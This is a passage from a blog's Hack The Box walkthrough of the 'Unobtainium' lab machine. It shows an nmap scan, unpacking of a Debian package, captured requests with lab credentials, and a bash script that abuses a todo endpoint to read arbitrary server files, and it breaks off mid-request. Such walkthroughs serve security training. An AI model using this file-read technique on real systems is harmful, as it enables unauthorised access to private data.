@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	10 Apr 2021IP:	10.10.10.235">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[Unobtainium]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/04/23/Unobtainium/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	10 Apr 2021IP:	10.10.10.235">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1929.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1930.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1931.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1932.jpg">
+<meta property="article:published_time" content="2021-04-23T03:58:10.000Z">
+<meta property="article:modified_time" content="2021-09-05T07:39:58.662Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1929.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/04/23/Unobtainium/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/04/23/Unobtainium/","path":"2021/04/23/Unobtainium/","title":"Hack-The-Box-walkthrough[Unobtainium]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[Unobtainium] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-80"><span class="nav-number">3.</span> <span class="nav-text">Port-80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-escalation"><span class="nav-number">4.</span> <span class="nav-text">Privilege escalation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">5.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">6.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/04/23/Unobtainium/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[Unobtainium] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[Unobtainium]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-04-23 11:58:10" itemprop="dateCreated datePublished" datetime="2021-04-23T11:58:10+08:00">2021-04-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-09-05 15:39:58" itemprop="dateModified" datetime="2021-09-05T15:39:58+08:00">2021-09-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	Hard<br>Points:	40<br>Release:	10 Apr 2021<br>IP:	10.10.10.235</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1929.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.235</span></span><br><span class="line">PORT      STATE SERVICE          VERSION</span><br><span class="line">22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">2379/tcp  open  ssl/etcd-client?</span><br><span class="line">2380/tcp  open  ssl/etcd-server?</span><br><span class="line">8443/tcp  open  ssl/https-alt</span><br><span class="line">10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</span><br><span class="line">10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</span><br><span class="line">31337/tcp open  http             Node.js Express framework</span><br></pre></td></tr></table></figure>
+
+<p>There is a lot’s of ports open</p>
+<p>Let’s start with port-80</p>
+<h3 id="Port-80"><a href="#Port-80" class="headerlink" title="Port-80"></a>Port-80</h3><p>There is a simple html page.</p>
+<p>Let’s download the .deb package, i am using kali linux</p>
+<p>Unzip the file we got .deb package.</p>
+<p>Let’s extract the files inside .deb package without installing them.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># wget http://10.10.10.235/downloads/unobtainium_debian.zip</span></span><br><span class="line">--2021-04-23 00:06:14--  http://10.10.10.235/downloads/unobtainium_debian.zip</span><br><span class="line">正在连接 10.10.10.235:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：54853780 (52M) [application/zip]</span><br><span class="line">正在保存至: “unobtainium_debian.zip”</span><br><span class="line"></span><br><span class="line">unobtainium_debian.zip               100%[====================================================================&gt;]  52.31M  1017KB/s  用时 96s     </span><br><span class="line"></span><br><span class="line">2021-04-23 00:07:50 (559 KB/s) - 已保存 “unobtainium_debian.zip” [54853780/54853780])</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">unobtainium_debian.zip</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># unzip unobtainium_debian.zip </span></span><br><span class="line">Archive:  unobtainium_debian.zip</span><br><span class="line">  inflating: unobtainium_1.0.0_amd64.deb  </span><br><span class="line"> extracting: unobtainium_1.0.0_amd64.deb.md5sum  </span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">unobtainium_1.0.0_amd64.deb  unobtainium_1.0.0_amd64.deb.md5sum  unobtainium_debian.zip</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># mkdir stuff</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># dpkg-deb -xv unobtainium_1.0.0_amd64.deb stuff</span></span><br><span class="line">./</span><br><span class="line">./usr/</span><br><span class="line">./usr/share/</span><br><span class="line">./usr/share/icons/</span><br><span class="line">./usr/share/icons/hicolor/</span><br><span class="line">./usr/share/icons/hicolor/32x32/</span><br><span class="line">./usr/share/icons/hicolor/32x32/apps/</span><br><span class="line">./usr/share/icons/hicolor/32x32/apps/unobtainium.png</span><br><span class="line">./usr/share/icons/hicolor/48x48/</span><br><span class="line">./usr/share/icons/hicolor/48x48/apps/</span><br><span class="line">./usr/share/icons/hicolor/48x48/apps/unobtainium.png</span><br><span class="line">./usr/share/icons/hicolor/256x256/</span><br><span class="line">./usr/share/icons/hicolor/256x256/apps/</span><br><span class="line">./usr/share/icons/hicolor/256x256/apps/unobtainium.png</span><br><span class="line">./usr/share/icons/hicolor/128x128/</span><br><span class="line">./usr/share/icons/hicolor/128x128/apps/</span><br><span class="line">./usr/share/icons/hicolor/128x128/apps/unobtainium.png</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>Inside stuff&#x2F;opt&#x2F;unobtainium&#x2F; there is a executable called unobtainium</p>
+<p>Let’s run that</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium/stuff/opt/unobtainium]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">chrome_100_percent.pak  libEGL.so             libvulkan.so            resources          unobtainium</span><br><span class="line">chrome_200_percent.pak  libffmpeg.so          LICENSE.electron.txt    resources.pak      v8_context_snapshot.bin</span><br><span class="line">chrome-sandbox          libGLESv2.so          LICENSES.chromium.html  snapshot_blob.bin  vk_swiftshader_icd.json</span><br><span class="line">icudtl.dat              libvk_swiftshader.so  locales                 swiftshader</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium/stuff/opt/unobtainium]</span><br><span class="line">└─<span class="comment"># ./unobtainium --no-sandbox</span></span><br><span class="line">(node:2278) electron: The default of contextIsolation is deprecated and will be changing from <span class="literal">false</span> to <span class="literal">true</span> <span class="keyword">in</span> a future release of Electron.  See https://github.com/electron/electron/issues/23506 <span class="keyword">for</span> more information</span><br></pre></td></tr></table></figure>
+
+<p>We got the error Unable to reach unobtainium.htb.</p>
+<p>Let’s add unobtainium.htb in our &#x2F;etc&#x2F;hosts file.</p>
+<p>Let’s again open the executable and this time we don’t get error.</p>
+<p>I think this executable contact to a server so for capture the packet i use wireshark on tun0.</p>
+<p>And i am right when i click on Todo they send a POST req to the server.</p>
+<p>Let’s check what was capture inside this POST req.</p>
+<p>request:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /todo HTTP/1.1</span><br><span class="line">Host: unobtainium.htb:31337</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 73</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;auth&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;felamos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;Winter2021&quot;</span>&#125;,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;todo.txt&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>response:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 293</span><br><span class="line">ETag: W/<span class="string">&quot;125-tNs2+nU0UiQGmLreBy4Pj891aVA&quot;</span></span><br><span class="line">Date: Fri, 23 Apr 2021 04:21:51 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Keep-Alive: <span class="built_in">timeout</span>=5</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;ok&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;content&quot;</span>:<span class="string">&quot;1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>We got the creads.</p>
+<p>It’s seems like Todo function has the capability to read files from the server.</p>
+<p>For the simplicity i wrote a script to check if we also read file from the server?.</p>
+<p>I also run the burp for capture the req.</p>
+<p>Before running the script install the requirements for the script.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install jq</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>luci.sh</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">RHOST=<span class="string">&quot;unobtainium.htb&quot;</span></span><br><span class="line">RPORT=31337</span><br><span class="line">UA=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span></span><br><span class="line">PROXY=<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">FILE=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> - &lt;&lt;<span class="string">EOF &gt; message.json</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;auth&quot;:</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        &quot;name&quot;:&quot;felamos&quot;,</span></span><br><span class="line"><span class="string">        &quot;password&quot;:&quot;Winter2021&quot;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;filename&quot;:&quot;$&#123;FILE&#125;&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">CONTENT=<span class="string">&quot;<span class="subst">$(curl -s \</span></span></span><br><span class="line"><span class="subst"><span class="string">                -A <span class="string">&quot;<span class="variable">$&#123;UA&#125;</span>&quot;</span> \</span></span></span><br><span class="line"><span class="subst"><span class="string">                -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span></span></span><br><span class="line"><span class="subst"><span class="string">                -d <span class="string">&quot;<span class="subst">$(cat message.json | jq -c)</span>&quot;</span> \</span></span></span><br><span class="line"><span class="subst"><span class="string">                -x <span class="string">&quot;<span class="variable">$&#123;PROXY&#125;</span>&quot;</span> \</span></span></span><br><span class="line"><span class="subst"><span class="string">                http://$&#123;RHOST&#125;:$&#123;RPORT&#125;/todo \</span></span></span><br><span class="line"><span class="subst"><span class="string">           | jq .content \</span></span></span><br><span class="line"><span class="subst"><span class="string">           | sed -e &#x27;s/^.//&#x27; -e &#x27;s/.$//&#x27;)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;<span class="variable">$CONTENT</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Got the req let’s send it to repeater and check the responce.</p>
+<p>request:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /todo HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: unobtainium.htb:31337</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;auth&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;felamos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;Winter2021&quot;</span>&#125;,<span class="string">&quot;filename&quot;</span>:<span 